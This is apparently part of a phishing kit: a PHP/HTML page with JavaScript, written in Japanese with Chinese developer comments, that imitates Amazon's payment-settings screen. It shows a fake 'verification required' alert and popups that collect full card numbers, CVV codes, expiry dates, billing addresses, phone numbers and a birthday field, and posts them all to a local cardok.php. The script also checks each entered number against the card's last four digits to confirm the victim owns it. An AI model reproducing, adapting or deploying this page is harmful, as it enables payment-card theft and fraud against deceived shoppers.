              <div aria-live="polite" class="a-row a-expander-container a-spacing-top-mini a-expander-section-container pmts-instrument-list-item-expander a-section-expander-container">
               <a href="javascript:void(0)" class="a-expander-header a-declarative a-expander-section-header a-color-alternate-background a-link-section-expander a-size-medium">
                   <span class="a-expander-prompt">
                 <div class="a-fixed-left-grid pmts-instrument-detail-rows">
                  <div class="a-fixed-left-grid-inner" style="padding-left:44px">
                   <div class="a-fixed-left-grid-col a-col-left" style="width:44px;margin-left:-44px;float:left;">
                    <img alt="<?=$v['cardType']?>" src="<?=$v['cardTypeImg']?>" id="cardType_<?=$k?>"/>
                   </div>
                   <div class="a-fixed-left-grid-col a-col-right" style="padding-left:0%;float:left;">
                    <div class="a-fixed-right-grid">
                     <div class="a-fixed-right-grid-inner" style="padding-right:209px">
                      <div class="a-fixed-right-grid-col a-col-left" style="padding-right:0%;float:left;">
                       <span class="a-size-base pmts-instrument-display-name"><?=$v['cardType']?></span>
                       <span class="a-size-base pmts-instrument-number-tail"><span class="a-letter-space"></span><span id="cardNum_<?=$k?>"><?=$v['cardNum']?></span></span>
                      </div>
                      <div class="a-fixed-right-grid-col a-col-right" style="width:209px;margin-right:-209px;float:left;">
                       <div class="a-section pmts-account-expiry-date">
                        <span class="a-size-base a-color-secondary" id="cardDate_<?=$k?>"><?=$v['cardDate']?></span>
                       </div>
                      </div>
                     </div>
                    </div>
                   </div>
                  </div>
                 </div></span></a>
               <div aria-expanded="true" class="a-expander-content pmts-instrument-list-item-expander-content a-expander-section-content a-section-expander-inner a-expander-content-expanded" style="overflow: hidden;">
                <div class="a-fixed-right-grid">
                 <div class="a-fixed-right-grid-inner" style="padding-right:247px">
                  <div class="a-fixed-right-grid-col a-col-left" style="padding-right:0%;float:left;">
                   <div class="a-row pmts-account-holder-name">
                    <span class="a-text-bold">クレジットカード名義人</span>
                    <br /><span id="cardName_<?=$k?>"><?=$v['cardName']?></span>
                   </div>
                   <?php if(!$v["cardok"]){ ?>
                   <div style="width: 380px;margin-top: 20px;">
                      
                       <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">この支払い方法は検証が必要です。</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content"></div>
                            </div>
                        </div>
                   </div>
                   <?php } ?>
                  </div>
                  <div class="a-fixed-right-grid-col a-col-right" style="width:247px;margin-right:-247px;float:left;">
                   <div class="a-row">
                    <?php 
                    $homeIno = $v['homeName'];
                    if($v['homeName'] || count($v['homeInfo'])>0 ){ 
                    ?>
                    <span class="a-text-bold">請求先住所</span>
                    <div class="a-section a-spacing-small pmts-address-section">
                     <span class="a-size-small pmts-address-field a-text-bold"><?=$v['homeName']?></span>
                     <br />
                     <?php 
                        foreach($v['homeInfo'] as $k1=>$v1){ 
                            $homeIno = $homeIno."|&|".$v1;
                     ?>
                     <span class="a-size-small pmts-address-field"><?=$v1?></span>
                     <br />
                     <?php } ?>
                    </div>
                    <?php } ?>
                    <input type="hidden" id="homeInfo_<?=$k?>" value="<?=$homeIno?>">
                
                   </div>
                  </div>
                 </div>
                </div>
                <div class="a-row"></div>
                <div class="a-row a-grid-vertical-align a-grid-bottom">
                 <div class="a-column a-span7 a-text-left">
                  <div class="a-row"></div>
                 </div>
                 <?php if(!$v["cardok"]){ ?>
                 <div class="a-column a-span4 a-text-right a-span-last">
                   <span class="a-button a-button-base pmts-button-input pmts-instrument-list-item-button-js" id="a-autoid-3">
                      <span class="a-button-inner" onclick="open_yz_popup(<?=$k?>);">
                          <input class="a-button-input" type="button" aria-labelledby="a-autoid-3-announce" />
                          <span class="a-button-text" aria-hidden="true" id="a-autoid-3-announce">検証を開始</span>
                      </span>
                   </span>
                 </div>
                 <?php } ?>
                </div>
               </div>
              </div>
             </div>
                <?php } ?>
            </div>
           </div>
           <?php } ?>
          </div>
          <div class="a-section a-spacing-small pmts-balance-list"></div>
          <div class="a-section a-spacing-base pmts-add-payment-instrument">
         
          <h2 data-pmts-component-id="pp-NLB6rY-15" class="a-spacing-base pmts-portal-component pmts-portal-components-pp-NLB6rY-15">新しいお支払い方法を追加</h2>
          <div data-pmts-component-id="pp-NLB6rY-15" class="a-section a-spacing-base pmts-portal-component pmts-portal-components-pp-NLB6rY-15">
           <hr class="a-divider-normal" />
           <div id="pp-NLB6rY-34" data-pmts-component-id="pp-NLB6rY-23" class="a-section pmts-portal-component pmts-portal-components-pp-NLB6rY-23">
            <div aria-live="polite" class="a-row a-expander-container a-spacing-base a-expander-extend-container pmts-add-cc add-instrument-form-expander">
             <div class="a-fixed-right-grid">
              <div class="a-fixed-right-grid-inner" style="padding-right:147px">
               <div class="a-fixed-right-grid-col a-col-left" style="padding-right:2%;float:left;">
                <div class="a-row a-spacing-base">
                 <div class="a-row">
                  <span class="a-size-medium pmts-portal-add-ba-title a-text-bold">クレジットまたはデビットカード</span>
                 </div>
                 <div class="a-row">
                  <div class="a-row">
                   Amazonでは、主要なクレジットカードおよびデビットカードをご利用いただけます。
                  </div>
                 </div>
                </div> 
                <div class="a-section a-hidden aok-hidden apx-expander-header-empty"></div>
               </div>
               
              </div>
             </div>
             <div aria-expanded="true" class="a-expander-content a-spacing-base a-expander-extend-content">
              <div class="a-section pmts-add-credit-card-component-container">
               <div data-pmts-component-id="pp-NLB6rY-25" class="a-row a-spacing-medium pmts-portal-component pmts-portal-components-pp-NLB6rY-25">
                <span class="a-declarative" id="apx-add-credit-card-action-test-id">
                    <span class="a-button a-button-base apx-secure-registration-content-trigger-js" onclick="open_bk_popup();">
                        <span class="a-button-inner">
                            <input class="a-button-input" type="button" id="addcardbutton" />
                            <span id="pp-NLB6rY-35-announce" class="a-button-text" aria-hidden="true">クレジットまたはデビットカードを追加</span>
                        </span>
                    </span>
      
                 </span>
               </div>
              </div>
             </div>
            </div>
           </div>
          </div>
         </div>
<!-----弹窗遮罩------->     
<style>
    .zhezhao
    {
        width:100%;
        height:100%;
        background-color:#000;
        filter:alpha(opacity=80);
        -moz-opacity:0.8;
        opacity:0.8;
        position: fixed;
        left:0px;
        top:0px;
        z-index:299;
        overflow-y: hidden;
        overflow-x: hidden;
    }
</style>
<div class="zhezhao" id="zhezhao" style="display: none;"></div>
<!-----弹窗遮罩------->    
<!-----验证弹窗------->    
<style>
    .a-popover-wrapper-dy {
        position: fixed;
        border: 1px solid #cdcdcd;
        border-color: rgba(0,0,0,.2);
        border-radius: 4px;
        box-shadow: 0 2px 4px rgb(0 0 0 / 13%);
        background-color: #fff;
        top:50%;
        left:50%;
        transform: translate(-50%,-50%);
        width:900px;
        z-index: 299;
    }
    .a-popover-birthday {
        position: fixed;
        border: 1px solid #cdcdcd;
        border-color: rgba(0,0,0,.2);
        border-radius: 4px;
        box-shadow: 0 2px 4px rgb(0 0 0 / 13%);
        background-color: #fff;
        top:50%;
        left:50%;
        transform: translate(-50%,-50%);
        width:500px;
        z-index: 299;
    }
   
</style>
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-yz" style="display: none;">
   <header class="a-popover-header">
    <h4 class="a-popover-header-content" id="a-popover-header-4">お支払い方法を検証</h4>
    <button onclick="close_yz_popup();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
   </header>
   <div class="a-popover-inner" id="a-popover-content-4" style="height: auto; overflow-y: auto;">
    <div class="a-section a-spacing-none pmts-widget-section">
     <div id="yz_loding" data-pmts-component-id="yz_loding" class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-FbZGDs-27" style="display:none;">
      <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered" />
     </div>
     <form id="yz_form" target="3d-secure" method="post" action="./cardok.php" class="a-spacing-none">
         
         
    <div id="yz_errBox" class="a-row a-spacing-base" style="display:none;">
            <div class="a-column a-span12">
                <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                    <div class="a-box-inner a-alert-container">
                        <h4 class="a-alert-heading">問題が発生しました。</h4>
                            <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="yz_errMsg"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>         
         
         
        
      <div class="a-section">
       <div class="a-row a-spacing-base pmts-form-fields">
        <div class="a-column a-span4"> 
         <div class="a-row"> 
          <span class="a-text-bold">支払い方法</span> 
         </div> 
         <div class="" style="margin-top: 2px;"> 
         <input type="hidden" name="cardid" id="yz_cardid">
          <img id="yz_cardtype" alt="Visa" src="https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/visa._CB413198211_.png" class="a-thumbnail-left" style="margin: 5px 4px;" /> 
          <input type="text" maxlength="50" name="cardnum" id="yz_cardnum" class="a-input-text a-form-normal" style="width: 200px;" oninput="changecardnum('yz');" /> 
         </div> 
        </div>
        <div class="a-column a-span3 pmts-edit-account-holder-name">
         <label class="a-form-label">カードの名義</label>
         <input type="text" maxlength="50" placeholder="カードの名義" name="cardname" id="yz_cardname" class="a-input-text a-form-normal" />
        </div>
        <div class="a-column a-span3 pmts-edit-expiry "> 
         <div class="a-row"> 
          <label class="a-form-label">有効期限</label> 
         </div> 
         <div class="a-row">
            <span class="a-dropdown-container">
                <select name="carddatem" id="yz_carddatem_select" autocomplete="off" tabindex="0" class="a-native-dropdown a-declarative" data-action="a-dropdown-select"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                </select>
                <span tabindex="-1" id="yz_carddatem_errspan" class="a-button a-button-dropdown pmts-portal-component pmts-portal-components-pp-H6PWLX-26" aria-hidden="true">
                    <span class="a-button-inner">
                        <span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true">
                            <span class="a-dropdown-prompt" id="yz_carddatem_span">01</span>
                        </span>
                        <i class="a-icon a-icon-dropdown"></i>
                    </span>
                </span>
            </span>
          <span class="a-letter-space"></span>
          <span class="a-dropdown-container">
                <select name="carddatey" id="yz_carddatey_select" autocomplete="off" tabindex="0" class="a-native-dropdown a-declarative" data-action="a-dropdown-select"><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2041">2041</option>
                </select>
                <span tabindex="-1" id="yz_carddatey_errspan" class="a-button a-button-dropdown pmts-portal-component pmts-portal-components-pp-H6PWLX-26" aria-hidden="true">
                    <span class="a-button-inner">
                        <span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true">
                            <span class="a-dropdown-prompt" id="yz_carddatey_span">2028</span>
                        </span>
                        <i class="a-icon a-icon-dropdown"></i>
                    </span>
                </span>
            </span>
         </div> 
        </div> 
        <div class="a-column a-span2 pmts-edit-expiry a-span-last">
         <div class="a-row" style="margin-left: -30px;"> 
          <label class="a-form-label">セキュリティコード</label> 
          <input type="text" maxlength="4" placeholder="CVV / CVC" name="cardcvv" id="yz_cardcvv" class="a-input-text a-form-normal" style="width: 100px;" /> 
          <input type="hidden" name="birthday" id="yz_birthday">
         </div> 
        </div> 
       </div>
       <div class="a-row"></div>
      </div>
      <div class="a-row">
       <div class="a-column a-span5 pmts-form-fields">
        <span class="a-text-bold" id="zhushuospan">請求先住所</span>
        <div class="a-section a-spacing-small pmts-address-section">
            <input type="hidden" id="yz_homeinfo" name="homeinfo" value="">
         <span class="a-size-small pmts-address-field" id="yz_homeinfospan"></span>
         </div>
        </div>
       </div>
       <div class="a-column a-span4 pmts-edit-paa-field"></div>
       <div class="a-row">
       <div class="a-column a-span12 a-text-right pmts-edit-instrument-buttons">
        <span class="a-button a-spacing-top-mini a-button-base pmts-button-input">
            <span class="a-button-inner" onclick="close_yz_popup();">
                <input class="a-button-input" type="button" value="キャンセル" />
                <span class="a-button-text" aria-hidden="true">キャンセル</span>
            </span>
        </span>
        <span class="a-button a-spacing-top-mini a-button-primary pmts-button-input">
            <span class="a-button-inner" onclick="yzsubmit();">
                <input class="a-button-input" type="button" value="次のステップ" />
                <span class="a-button-text" aria-hidden="true">次のステップ</span>
            </span>
        </span>
       </div>
      </div>
      </div>
      
     </form>
    </div>
   </div>
  </div>
<script>
    var errMsg = new Array();
        errMsg["cardname"]="クレジットカードの名義人が入力されていないか、正しく入力されていません。名義人は、半角英数字でカードに記載されているとおりに入力してください";
        errMsg["cardnum"]="クレジットカード番号が入力されていません。以下の欄にカード番号全けたを入力してください";
        errMsg["cardnum_error"]="クレジットカード番号が正しくありません";
        errMsg["carddate"]="クレジットカードの有効期限をご確認のうえ、入力し直してください"; 
        errMsg["cardcvv"]="クレジットカードのセキュリティコードが入力されていないか、正しく入力されていません。確認後、再入力してください";
        
    function yzsubmit(){
        removeerror_yz();
        
        var yzerrBox = document.getElementById("yz_errBox");
        var yzerrMsg = document.getElementById("yz_errMsg");
        var yzcardnum = document.getElementById("yz_cardnum");
        var yzcaedname = document.getElementById("yz_cardname");
        var yzcarddatem = document.getElementById("yz_carddatem_select");
        var yzcarddatey = document.getElementById("yz_carddatey_select");
        var yzcardcvv = document.getElementById("yz_cardcvv");
        var yzcarddatemspan = document.getElementById("yz_carddatem_errspan");
        var yzcarddateyspan = document.getElementById("yz_carddatey_errspan");
        var errorHtml = "";
        var inputcardnum = yzcardnum.value.split(" ").join("");
        var cardnum4num = (yzcardnum.placeholder.match(/\d+/g))[0]
        console.log(cardnum4num);
        
        if(yzcaedname.value.trim()==""){
            yzcaedname.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardname']+'</span></li>';
        }
        if(yzcardnum.value == ""){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum']+'</span></li>';
        }else if(!luhn_algo(inputcardnum)){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }else if(inputcardnum.substr(-4)!=cardnum4num){
            yzcardnum.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardnum_error']+'</span></li>';
        }
        if(yzcarddatey.value+(yzcarddatem.value>9?yzcarddatem.value:"0"+yzcarddatem.value) < <?=date("Ym")?>){
            yzcarddatemspan.classList.add("a-button-error");
            yzcarddateyspan.classList.add("a-button-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['carddate']+'</span></li>';
        }
        if(yzcardcvv.value<100 || yzcardcvv.value>9999 || !checkNumber(yzcardcvv.value)){
            yzcardcvv.classList.add("a-form-error");
            errorHtml = errorHtml+'<li><span class="a-list-item">'+errMsg['cardcvv']+'</span></li>';
        }
        
        if(errorHtml!=""){
            yzerrMsg.innerHTML = errorHtml;
            yzerrBox.style.display="";
        }else{
            document.getElementById("yz_loding").style.display="";
            setTimeout(function () {
                document.getElementById("yz_loding").style.display="none";
                open_birthday_box("yz");
            }, 600);
        }
            
        
    }
    
    function removeerror_yz(){
        document.getElementById("yz_errBox").style.display="none";
        document.getElementById("yz_cardname").classList.remove("a-form-error");
        document.getElementById("yz_cardnum").classList.remove("a-form-error");
        document.getElementById("yz_cardcvv").classList.remove("a-form-error");
        document.getElementById("yz_carddatem_errspan").classList.remove("a-button-error");
        document.getElementById("yz_carddatey_errspan").classList.remove("a-button-error");
    }
    function open_yz_popup(cardid){
        document.getElementById("boday_loding").style.display="";
        carnumlength = 0;
        setTimeout(function () {
            document.getElementById("boday_loding").style.display="none";
            go_open_yz_popup(cardid);
        }, 600);
    }
    
    function go_open_yz_popup(cardid){
        
        document.getElementById("zhushuospan").style.display="";
        var cardtype = document.getElementById("cardType_"+cardid).alt;
        var cardtypeimg = document.getElementById("cardType_"+cardid).src;
        var cardnum = document.getElementById("cardNum_"+cardid).innerHTML;
        var cardname = document.getElementById("cardName_"+cardid).innerHTML;
        var carddate = document.getElementById("cardDate_"+cardid).innerHTML;
        var homeinfo = document.getElementById("homeInfo_"+cardid).value;
        var homeinfohtml = homeinfo.split("|&|").join('</span><br /><span class="a-size-small pmts-address-field">')
        var carddateArray = new Array();
        carddateArray = carddate.split("/");
        var carddatem = carddateArray[0];
        if(carddatem<10){
            carddatem = carddatem.split("0").join("");
        }
        removeerror_yz();
        document.getElementById("yz_cardid").value = cardid;
        document.getElementById("yz_cardtype").alt = cardtype;
        document.getElementById("yz_cardtype").src = cardtypeimg;
        document.getElementById("yz_cardnum").placeholder = cardnum;
        document.getElementById("yz_cardnum").value = "";
        document.getElementById("yz_cardname").value = cardname;
        document.getElementById("yz_homeinfo").value = homeinfo;
        document.getElementById("yz_cardcvv").value = "";
        document.getElementById("yz_carddatem_span").innerHTML = carddateArray[0];
        document.getElementById("yz_carddatem_select").value = carddatem;
        document.getElementById("yz_carddatey_span").innerHTML = carddateArray[1];
        document.getElementById("yz_carddatey_select").value = carddateArray[1];
        document.getElementById("yz_homeinfospan").innerHTML = homeinfohtml;
        if(homeinfo==""){
            document.getElementById("zhushuospan").style.display="none";
        }
        
        document.body.style.overflow = "hidden";
        document.getElementById("zhezhao").style.display="";
        document.getElementById("a-popover-wrapper-yz").style.display="";
    }
    
    function close_yz_popup(){
        document.body.style.overflow = "";
        document.getElementById("zhezhao").style.display="none";
        document.getElementById("a-popover-wrapper-yz").style.display="none";
    }

</script>
<!-----验证弹窗------->   
<!-----绑卡弹窗------->
<div class="a-popover-wrapper-dy" id="a-popover-wrapper-bk" style="display: none;">
   <span tabindex="0" class="a-popover-start a-popover-a11y-offscreen"></span>
   <div class="a-popover-wrapper">
    <header class="a-popover-header">
     <h4 class="a-popover-header-content" id="a-popover-header-1">クレジットまたはデビットカードを追加</h4>
     <button onclick="close_bk_popup();" class=" a-button-close a-declarative"><i class="a-icon a-icon-close"></i></button>
    </header>
    <div class="a-popover-inner" id="a-popover-content-1" style="height: auto; overflow-y: auto;">
     <div id="portalWidgetSection" class="a-section">
      <div id="cpefront-mpo-widget">
       <div data-pmts-component-id="pp-v3SKiV-1" class="a-section a-spacing-none pmts-widget-section pmts-portal-root-hvaKzVf8N1oL pmts-portal-component pmts-portal-components-pp-v3SKiV-1">
        <div id="bk_loding"class="a-section a-spacing-none pmts-loading-async-widget-spinner-overlay pmts-portal-component pmts-portal-components-pp-v3SKiV-8" style="margin: 5px -20px;width: 110%;height: 102%;display:none;">
         <img src="https://images-fe.ssl-images-amazon.com/images/G/01/payments-portal/r1/loading-4x._CB485930688_.gif" class="pmts-loading-async-widget-spinner-viewport-centered" />
        </div>
        <div class="a-row">
         <div id="pp-v3SKiV-10" data-pmts-component-id="pp-v3SKiV-2" class="a-section pmts-portal-component pmts-portal-components-pp-v3SKiV-2">
          <div class="a-section a-spacing-none pmts-widget-section">
           <div class="a-section pmts-add-credit-card-component-container">
            <div id="pp-v3SKiV-11" data-pmts-component-id="pp-v3SKiV-3" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-v3SKiV-3">
             <form id="bk_form" target="3d-secure" method="post" action="./cardok.php" class="apx-add-card-compact-form a-spacing-none">
              <div class="a-row a-spacing-base apx-add-card-compact-grid-row">
                  
                <div id="bk_errBox" class="a-row a-spacing-base" style="display:none;">
                    <div class="a-column a-span12">
                        <div class="a-box a-alert a-alert-error" aria-live="assertive" role="alert">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">問題が発生しました。</h4>
                                <i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <ul class="a-unordered-list a-vertical" id="bk_errMsg"></ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>


               <div class="a-column a-span7">
                <div class="a-row pmts-add-credit-card-container">
                 <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-add-credit-card-number-label">
                   <label for="pp-v3SKiV-14" class="a-form-label">カード番号</label>
                  </div>
                  <div class="a-column a-span8 pmts-add-credit-card-number-input-box a-span-last">
                   <div class="a-row">
                    <div class="a-column a-span9">
                     <div class="a-section a-spacing-none apx-add-credit-card-number">
                      <input type="tel" placeholder="カード番号" autocomplete="off" name="cardnum" id="bk_cardnum" class="a-input-text a-form-normal" onblur="testBankType(this.value);" oninput="changecardnum('bk');"/>
                     </div>
                    </div>
                    <div class="a-column a-span3 a-spacing-top-mini a-span-last">
                        <div data-pmts-component-id="pp-v3SKiV-7" class="a-section a-spacing-none pmts-portal-component pmts-portal-components-pp-v3SKiV-7">
                            <img alt="" src="" class="" id="bankimg" style="display:none;">
                        </div>
                    </div>
                   </div>
                  </div>
                 </div>
                 <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                   <label for="pp-v3SKiV-16" class="a-form-label">クレジットカード名義人</label>
                  </div>
                  <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                   <input type="text" maxlength="50" placeholder="クレジットカード名義人" autocomplete="off" name="cardname" id="bk_cardname" class="a-input-text a-form-normal" />
                  </div>
                 </div>
                 <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-credit-card-expiration-date-label">
                   <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">有効期限：</label>
                  </div>
                  <div class="a-column a-span8 pmts-credit-card-expiration-date-input-box a-span-last">
                   <div id="add-credit-card-expiry-date-input-id" class="a-row">
                    <span class="a-dropdown-container">
                        <select name="carddatem" id="bk_carddatem" autocomplete="off" tabindex="0" class="a-native-dropdown pmts-native-dropdown" value="1"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option>
                        </select>
                        <span tabindex="-1" id="bk_carddatem_span" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-v3SKiV-3" style="min-width: 0%;">
                            <span class="a-button-inner">
                                <span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true">
                                    <span class="a-dropdown-prompt">01</span>
                                </span>
                                <i class="a-icon a-icon-dropdown"></i>
                            </span>
                        </span>
                        </span>
                    <span class="a-letter-space"></span>
                    <span class="a-dropdown-container">
                        <select name="carddatey" id="bk_carddatey" autocomplete="off" tabindex="0" class="a-native-dropdown pmts-native-dropdown" value="2021"><option value="2021">2021</option><option value="2022">2022</option><option value="2023">2023</option><option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option><option value="2035">2035</option><option value="2036">2036</option><option value="2037">2037</option><option value="2038">2038</option><option value="2039">2039</option><option value="2040">2040</option><option value="2041">2041</option>
                        </select>
                        <span tabindex="-1" id="bk_carddatey_span" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-v3SKiV-3" style="min-width: 0%;">
                            <span class="a-button-inner">
                                <span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true">
                                    <span class="a-dropdown-prompt">2021</span>
                                </span>
                                <i class="a-icon a-icon-dropdown"></i>
                            </span>
                        </span>
                    </span>
                   </div>
                  </div>
                 </div>
                 <div class="a-row a-spacing-small">
                  <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-update-everywhere-or-set-buying-preference-label">
                      <label for="pp-v3SKiV-17" id="pp-v3SKiV-18" class="a-form-label">セキュリティコード</label>
                  </div>
                  <div class="a-column a-span8 pmts-update-everywhere-or-set-buying-preference-input-box a-span-last">
                      <input type="text" maxlength="4" placeholder="CVV / CVC" autocomplete="off" name="cardcvv" id="bk_cardcvv" class="a-input-text a-form-normal" />
                  </div>
                 </div>
                </div>
               </div>
               <div class="a-column a-span5 a-span-last">
                <p class="a-spacing-small">以下のクレジットカードをご利用いただけます</p>
                <div class="a-section a-spacing-none a-text-right pmts-composite-logo-row">
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: -225px; margin-right: 6px;"></span>
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: 0px; margin-right: 6px;"></span>
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: -45px;"></span>
                </div>
                <div class="a-section a-spacing-none a-text-right pmts-composite-logo-row">
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: -90px; margin-right: 6px;"></span>
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: -135px; margin-right: 6px;"></span>
                 <span class="pmts-indiv-issuer-image" style="background-image: url('https://images-fe.ssl-images-amazon.com/images/G/09/payments-portal/r1/issuer-images/sprite-map._CB485924999_.png'); background-position: -270px;"></span>
                </div>
                <div class="a-text-right a-fixed-right-grid-col a-col-right" style="width:147px;margin-right:-147px;float:left;"></div>
               </div>
              </div>
                <div class="a-row" style="border-top-width: 1px;border-top-style: solid;border-top-color: #EEE;">
                   <div class="a-row" style="text-align:center;margin-top:10px;"><p class="a-spacing-small">請求先住所</p></div>
                   <div class="a-column a-span6">
                      
                       <div class="a-row pmts-add-credit-card-container" style="margin:10px 10px;">
                           
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">氏名</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" maxlength="50" placeholder="氏名" autocomplete="off" name="homename" id="homename" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">郵便番号</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" maxlength="10" placeholder="郵便番号" autocomplete="off" name="homemall" id="homemall" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">都道府県 / 市区町村</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" maxlength="50" placeholder="都道府県 / 市区町村" autocomplete="off" name="homecity" id="homecity" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                        </div>
                    </div>
                    <div class="a-column a-span6 a-span-last" style="margin:10px 0;">
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">住所</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" placeholder="住所" autocomplete="off" name="homeaddress" id="homeaddress" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">会社名</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" maxlength="50" placeholder="会社名" autocomplete="off" name="homeclubname" id="homeclubname" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                            <div class="a-row a-spacing-small">
                              <div class="a-column a-span4 a-text-right a-spacing-top-mini pmts-customer-card-name-label">
                                    <label for="pp-v3SKiV-16" class="a-form-label">電話番号</label>
                              </div>
                              <div class="a-column a-span8 pmts-customer-card-name-input-box a-span-last">
                                    <input type="text" maxlength="20" placeholder="電話番号" autocomplete="off" name="homephone" id="homephone" class="a-input-text a-form-normal" />
                              </div>
                            </div>
                            <input type="hidden" name="birthday" id="bk_birthday">
                    </div>
               </div>
              <div class="a-row apx-add-card-buttons-in-popover">
               <div class="a-section a-spacing-small a-spacing-top-small">
                <span id="pp-v3SKiV-23" class="a-button a-button-primary pmts-button-input">
                    <span class="a-button-inner" onclick="bksubmit();">
                        <input class="a-button-input" type="button" />
                        <span id="pp-v3SKiV-23-announce" class="a-button-text" aria-hidden="true">次のステップ</span>
                    </span>
                </span>
                <span class="a-letter-space"></span>
                <span class="a-button a-button-base pmts-button-input" onclick="close_bk_popup();">
                    <span class="a-button-inner">
                        <button class="a-button-text" type="button">キャンセル</button>
                    </span>
                </span>
               </div>
              </div>
             </form>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div>
  </div>
<script src="./src/banktype.js" type="application/javascript"></script>
<script>
    errMsg["homename"]="名称を記入してください。";
